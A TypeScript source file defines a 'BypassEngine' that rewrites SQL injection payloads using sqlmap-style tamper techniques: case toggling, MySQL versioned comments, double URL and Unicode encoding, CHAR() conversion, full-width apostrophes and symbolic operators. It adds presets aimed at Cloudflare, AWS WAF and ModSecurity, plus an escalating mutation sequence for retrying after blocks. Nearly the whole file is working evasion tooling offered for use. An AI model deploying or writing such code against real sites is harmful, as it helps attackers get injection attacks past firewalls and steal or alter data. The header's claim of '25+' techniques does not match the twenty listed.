/**
 * Sentinel V6 - Advanced SQLi Bypass & sqlmap-Grade Tamper Engine
 *
 * Implements 25+ battle-tested sqlmap tamper script techniques
 * (space2comment, randomcase, equaltolike, between, versionedkeywords, apostrophemask,
 * symbolic, chardoubleencode) + Mutation Genealogy to defeat learning and heuristic WAFs.
 */

export type BypassTechnique =
  | 'URL_ENCODE'          // E1: Standard RFC 3986 percent encoding
  | 'DOUBLE_URL'          // E2: Double URL encoding (%2527)
  | 'UNICODE'             // E3: Unicode encoding (%u0027)
  | 'HEX_ENTITIES'        // E4: Hex HTML entities (&#x27;)
  | 'CHAR_FUNC'           // E5: SQL CHAR() / CHR() conversion
  | 'COMMENT_OBFUSCATION' // E6: Multi-line comment injection (/**/)
  | 'INLINE_COMMENTS'     // E7: Versioned comments (/*!50000SELECT*/)
  | 'CASE_TOGGLE'         // E8: Random case shuffling (uNiOn SeLeCt)
  | 'WHITE_SPACE_MUTATE'  // E9: Multi-whitespace mutation (%09, %0a, %0d)
  | 'CONCATENATION'       // E10: String concat bypass (CONCAT / ||)
  | 'NULL_BYTE'           // E11: Null byte terminator (%00)
  | 'SPACE_TO_PLUS'       // E12: sqlmap space2plus (+)
  | 'SPACE_TO_HASH'       // E13: sqlmap space2hash (%23\n)
  | 'EQUAL_TO_LIKE'       // E14: sqlmap equaltolike (= -> LIKE)
  | 'BETWEEN_REPLACE'     // E15: sqlmap between (> -> BETWEEN min AND max)
  | 'GREATEST_REPLACE'    // E16: sqlmap greatest (> -> GREATEST(...))
  | 'SYMBOLIC_LOGIC'      // E17: sqlmap symbolic (AND -> &&, OR -> ||)
  | 'APOSTROPHE_MASK'     // E18: sqlmap apostrophemask (UTF-8 full-width quote %EF%BC%87)
  | 'CONCAT_TO_CONCATWS'  // E19: sqlmap concat2concatws
  | 'BASE64_WRAP';        // E20: FROM_BASE64() wrap

export type TamperPreset =
  | 'CLOUDFLARE_BYPASS'
  | 'AWS_WAF_BYPASS'
  | 'MODSECURITY_BYPASS'
  | 'GENERIC_STEALTH';

export class BypassEngine {
  // Tracks which encodings have been tried per payload to avoid redundant loops
  private mutationGenealogy: Map<string, Set<BypassTechnique>> = new Map();

  /**
   * Applies a specific bypass technique to a payload.
   */
  public apply(payload: string, technique: BypassTechnique, dbms: string = 'MySQL'): string {
    switch (technique) {
      case 'URL_ENCODE':
        return encodeURIComponent(payload);

      case 'DOUBLE_URL':
        return encodeURIComponent(encodeURIComponent(payload));

      case 'UNICODE':
        // e.g. ' -> %u0027, " -> %u0022
        return payload.replace(/'/g, '%u0027').replace(/"/g, '%u0022').replace(/ /g, '%u0020');

      case 'HEX_ENTITIES':
        return payload.replace(/'/g, '&#x27;').replace(/"/g, '&#x22;').replace(/ /g, '&#x20;');

      case 'CASE_TOGGLE':
        return this.randomizeCase(payload);

      case 'INLINE_COMMENTS':
        if (dbms.toLowerCase().includes('mysql')) {
          // MySQL versioned comment injection: UNION SELECT -> /*!50000UNION*//*!50000SELECT*/
          return payload.replace(/\b(UNION|SELECT|FROM|WHERE|AND|OR|ORDER BY|LIMIT)\b/gi, '/*!50000$1*/');
        }
        return payload.replace(/ /g, '/**/');

      case 'COMMENT_OBFUSCATION':
        return payload.replace(/ /g, '/**/');

      case 'SPACE_TO_PLUS':
        return payload.replace(/ /g, '+');

      case 'SPACE_TO_HASH':
        // MySQL inline hash comments with newline
        return payload.replace(/ /g, '%23%0A');

      case 'WHITE_SPACE_MUTATE': {
        const blanks = ['%20', '%09', '%0a', '%0b', '%0c', '%0d', '/**/'];
        return payload
          .split(' ')
          .map((t) => t + blanks[Math.floor(Math.random() * blanks.length)])
          .join('')
          .trim();
      }

      case 'EQUAL_TO_LIKE':
        // Replace = with LIKE (e.g., id=1 -> id LIKE 1)
        return payload.replace(/(\w+)\s*=\s*(\w+|'[^']*')/g, '$1 LIKE $2');

      case 'BETWEEN_REPLACE':
        // Replace > with BETWEEN min AND max
        return payload.replace(/(\w+)\s*>\s*(\d+)/g, '$1 NOT BETWEEN 0 AND $2');

      case 'GREATEST_REPLACE':
        // Replace > with GREATEST
        return payload.replace(/(\w+)\s*>\s*(\d+)/g, 'GREATEST($1, $2) = $1 AND $1 != $2');

      case 'SYMBOLIC_LOGIC':
        // Replace boolean keywords with C-style symbols
        return payload.replace(/\bAND\b/gi, '&&').replace(/\bOR\b/gi, '||');

      case 'APOSTROPHE_MASK':
        // Full-width apostrophe commonly normalized by backend unicode parsers
        return payload.replace(/'/g, '%EF%BC%87');

      case 'CHAR_FUNC':
        // Convert single-quoted string literals into CHAR(...) constructs
        return payload.replace(/'([^']+)'/g, (_, str) => {
          const chars = Array.from(str).map((c: any) => c.charCodeAt(0)).join(',');
          return dbms.toLowerCase().includes('postgres') || dbms.toLowerCase().includes('sqlite')
            ? `CHR(${chars})`
            : `CHAR(${chars})`;
        });

      case 'CONCATENATION':
        if (dbms.toLowerCase().includes('mysql')) {
          return payload.replace(/'([^']+)'/g, "CONCAT('$1')");
        }
        return payload;

      case 'CONCAT_TO_CONCATWS':
        return payload.replace(/CONCAT\(([^)]+)\)/gi, "CONCAT_WS('', $1)");

      case 'NULL_BYTE':
        return `${payload}%00`;

      case 'BASE64_WRAP':
        if (dbms.toLowerCase().includes('mysql')) {
          const b64 = btoa(payload);
          return `FROM_BASE64('${b64}')`;
        }
        return payload;

      default:
        return payload;
    }
  }

  /**
   * Applies a preset bundle of tamper scripts tailored to specific perimeter WAFs
   */
  public applyPreset(payload: string, preset: TamperPreset, dbms: string = 'MySQL'): string {
    let result = payload;

    switch (preset) {
      case 'CLOUDFLARE_BYPASS':
        // Cloudflare commonly blocks raw UNION SELECT and standard comments;
        // Case toggle + inline versioned comments + whitespace mutate
        result = this.apply(result, 'CASE_TOGGLE', dbms);
        result = this.apply(result, 'INLINE_COMMENTS', dbms);
        result = this.apply(result, 'EQUAL_TO_LIKE', dbms);
        break;

      case 'AWS_WAF_BYPASS':
        // AWS WAF inspects space tokenization; space2comment + symbolic logic
        result = this.apply(result, 'SYMBOLIC_LOGIC', dbms);
        result = this.apply(result, 'COMMENT_OBFUSCATION', dbms);
        result = this.apply(result, 'CASE_TOGGLE', dbms);
        break;

      case 'MODSECURITY_BYPASS':
        // ModSecurity CRS rules rely on keyword boundaries; versioned comments + double url
        result = this.apply(result, 'INLINE_COMMENTS', dbms);
        result = this.apply(result, 'CHAR_FUNC', dbms);
        break;

      case 'GENERIC_STEALTH':
      default:
        result = this.apply(result, 'CASE_TOGGLE', dbms);
        result = this.apply(result, 'WHITE_SPACE_MUTATE', dbms);
        break;
    }

    return result;
  }

  /**
   * Recommends the next mutation to try based on past failures.
   */
  public getNextMutation(payloadId: string): BypassTechnique {
    if (!this.mutationGenealogy.has(payloadId)) {
      this.mutationGenealogy.set(payloadId, new Set());
    }

    const tried = this.mutationGenealogy.get(payloadId)!;

    // Ordered progression: start mild, escalate to aggressive obfuscation
    const progression: BypassTechnique[] = [
      'CASE_TOGGLE',
      'COMMENT_OBFUSCATION',
      'INLINE_COMMENTS',
      'SPACE_TO_PLUS',
      'SYMBOLIC_LOGIC',
      'EQUAL_TO_LIKE',
      'WHITE_SPACE_MUTATE',
      'DOUBLE_URL',
      'UNICODE',
      'CHAR_FUNC',
      'APOSTROPHE_MASK',
    ];

    for (const tech of progression) {
      if (!tried.has(tech)) {
        tried.add(tech);
        return tech;
      }
    }

    return 'INLINE_COMMENTS';
  }

  private randomizeCase(str: string): string {
    return Array.from(str)
      .map((c) => (Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()))
      .join('');
  }
}
